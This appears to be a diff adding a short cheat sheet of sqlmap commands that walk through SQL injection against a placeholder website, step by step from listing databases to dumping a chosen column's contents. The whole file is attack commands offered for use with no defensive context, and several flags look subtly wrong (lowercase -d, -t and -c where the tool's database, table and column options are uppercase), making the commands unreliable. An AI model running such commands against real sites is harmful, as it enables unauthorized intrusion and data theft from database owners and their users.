@@ -1,0 +1,8 @@
+sqlmap -u (website) --dbs
+
+sqlmap -u (website) -d (dbname) --tables
+
+sqlmap -u (website) -d (dbname) -t (table) --columns
+
+sqlmap -u (website) -d (dbname) -t (table) 
+-c (column) --dump
